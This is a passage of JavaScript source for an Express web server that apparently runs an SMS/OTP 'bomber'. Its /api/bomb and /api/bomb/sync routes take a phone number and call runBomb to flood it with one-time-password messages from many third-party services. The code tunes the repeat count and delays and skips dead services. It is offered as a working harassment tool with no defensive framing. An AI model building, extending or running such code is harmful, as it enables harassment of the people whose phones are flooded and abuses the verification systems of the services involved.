    stagger: clamp(Number(b.stagger) || DEFAULTS.stagger, 0, 500),
    resendGap: clamp(Number(b.resendGap) || DEFAULTS.resendGap, 800, 8000),
    skipDead: b.skipDead !== false,
  };
}

/* ================= routes ================= */

app.get('/api/health', (_req, res) => {
  const live = endpoints.filter(e => !isBenched(e.name)).length;
  res.json({ ok: true, services: endpoints.length, live, benched: endpoints.length - live });
});

app.get('/api/services', (_req, res) => {
  res.json(endpoints.map(e => ({ name: e.name, benched: isBenched(e.name) })));
});

app.get('/api/stats', (_req, res) => {
  res.json([...stats].map(([name, s]) => ({
    name, ok: s.ok, fail: s.fail, benched: s.benchedUntil > Date.now(),
  })));
});

app.post('/api/stats/reset', (_req, res) => {
  stats.clear();
  res.json({ ok: true });
});

app.post('/api/bomb', async (req, res) => {
  const n = normalize((req.body || {}).number);
  if (!n) {
    return res.status(400).json({
      error: 'Invalid number. 10-digit Indian number ya full E.164 (+919876543210) daalo.',
    });
  }

  res.setHeader('content-type', 'application/x-ndjson; charset=utf-8');
  res.setHeader('cache-control', 'no-cache, no-transform');
  res.setHeader('x-accel-buffering', 'no');
  if (res.flushHeaders) res.flushHeaders();

  const write = o => { if (!res.writableEnded) res.write(JSON.stringify(o) + '\n'); };

  try {
    await runBomb(n, readOpts(req.body), write);
  } catch (err) {
    write({ type: 'error', error: err.message });
  }
  res.end();
});

app.post('/api/bomb/sync', async (req, res) => {
  const n = normalize((req.body || {}).number);
  if (!n) return res.status(400).json({ error: 'invalid number' });

  const out = await runBomb(n, readOpts(req.body), () => {});
  res.json(out);
});

app.use('/api', (_req, res) => res.status(404).json({ error: 'unknown api route' }));

app.use(express.static(PUBLIC_DIR, { extensions: ['html'] }));

app.use((err, _req, res, _next) => {
  if (err && err.type === 'entity.parse.failed') {
    return res.status(400).json({ error: 'malformed JSON body' });
  }
  console.error('[error]', err);
  res.status(500).json({ error: 'server error' });
});

/* ================= start ================= */

const server = app.listen(PORT, HOST, () => {
  console.log('OTP Sender running -> http://localhost:' + PORT);
  console.log('services: ' + endpoints.length + ' | defaults: repeat=' +
    DEFAULTS.repeat + ' stagger=' + DEFAULTS.stagger + 'ms resendGap=' + DEFAULTS.resendGap + 'ms');
});

server.on('error', err => {
  if (err.code === 'EADDRINUSE') {
    console.error('Port ' + PORT + ' busy. Try: PORT=3001 npm start');
  } else {
    console.error('[listen]', err.message);
  }
  process.exit(1);
});
